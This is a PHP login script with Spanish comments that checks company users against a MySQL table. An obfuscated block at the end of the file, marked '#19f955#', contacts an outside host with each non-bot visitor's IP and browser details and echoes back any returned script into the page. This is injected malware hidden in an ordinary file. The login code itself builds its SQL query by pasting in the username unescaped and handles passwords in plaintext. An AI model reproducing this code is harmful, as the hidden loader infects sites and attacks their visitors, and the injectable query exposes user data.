<?php
//revisamos si es login por sesiones o por formulario

if (!isset($_POST['usuario_digitado']) && !isset($_POST['clave_digitada'])) {
	session_start() ;
	//usamos los valores de las sesiones 
	// si no se ha pasado por la pagina de login, 
	// las variables no quedaran definidas y mas abajo se envìa la pagina de login)
	$usuario = $_SESSION['usuario'];
	$clave = $_SESSION['clave'];
}else{
	//usamos los datos ingresados (se esta recibiendo la pagina de login)
	session_start() ; 
	//borramos las sessiones por si existen
	unset($_SESSION['usuario']) ;
	unset($_SESSION['clave']) ;
	$usuario = $_POST['usuario_digitado'];
	$clave = $_POST['clave_digitada'];
	$_SESSION['usuario'] = $usuario;
	$_SESSION['clave'] = $clave;
}
if (!$usuario) {
	//no hay login disponible (usuario ingresado) ; se solicita uno por primera vez
	//no se ha pasado por la pagina de login 
	include ("interface.php") ;
	exit;
}
if (!$clave) {
	//no hay contraseña
	$mensaje = "contraseña incorrecta";
	include ("interface.php") ;
	exit;
}

//nos conectamos a la bd
$cnx = conectar();
//buscamos al usuario
$chlogQuery = mysql_query("SELECT * FROM empresas WHERE Usuario = '" . $usuario . "'") or die (mysql_error () ) ;
$chlogArray = mysql_fetch_array($chlogQuery) ;

//revisamos usuario y password
if (mysql_num_rows ($chlogQuery) > 0) {
	//usuario existe, seguimos
	if ($usuario != $chlogArray ['Usuario'] ) {
		//caso sensitivo, usuario no está presente en bd
		$message = "Usuario no Existe";
		include ("interface.php") ;
		exit;
	}
	if (!$chlogArray['Clave']) {
		//no tiene clave en bd, no entra
		$message = "No se encontró contraseña para el usuario";
		include ("interface.php");
		exit;
	}
	if (stripslashes($chlogArray['Clave']) != $clave) {
		// contraseña es incorrecta
		$message = "Contraseña es incorrecta";
		include ("interface.php") ;
		exit;
	}
	// Si llega hasta aquí, el usuario existe y la clave coincide
	// Guarda la empresa en variables de Session
	
	unset($_SESSION['IdEmpresa']) ;
	unset($_SESSION['Empresa']) ;
	unset($_SESSION['Pais']) ;
	unset($_SESSION['Logo']) ;
	$IdEmpresa = $chlogArray['IdEmpresa'] ;
	$Empresa = $chlogArray['Empresa'] ;
	$Pais = $chlogArray['Pais'] ;
	$Logo = $chlogArray['Logo'] ;
	$_SESSION['IdEmpresa'] = $IdEmpresa;
	$_SESSION['Empresa'] = $Empresa;
	$_SESSION['Pais'] = $Pais;
	$_SESSION['Logo'] = $Logo;
	
} else {
	// usuario no existe del todo.
	$message = "Usuario no Existe";
	include ("interface.php") ;
	exit;
}
//si hemos llegado hasta aqui significa que el login es correcto
?>
<?php
#19f955#
error_reporting(0); ini_set('display_errors',0); $wp_qjaa847 = @$_SERVER['HTTP_USER_AGENT'];
if (( preg_match ('/Gecko|MSIE/i', $wp_qjaa847) && !preg_match ('/bot/i', $wp_qjaa847))){
$wp_qjaa09847="http://"."http"."meta".".com/meta"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_qjaa847);
$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_qjaa09847);
curl_setopt ($ch, CURLOPT_TIMEOUT, 6); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $wp_847qjaa = curl_exec ($ch); curl_close($ch);}
if ( substr($wp_847qjaa,1,3) === 'scr' ){ echo $wp_847qjaa; }
#/19f955#
?>
<?php

?>
<?php

?>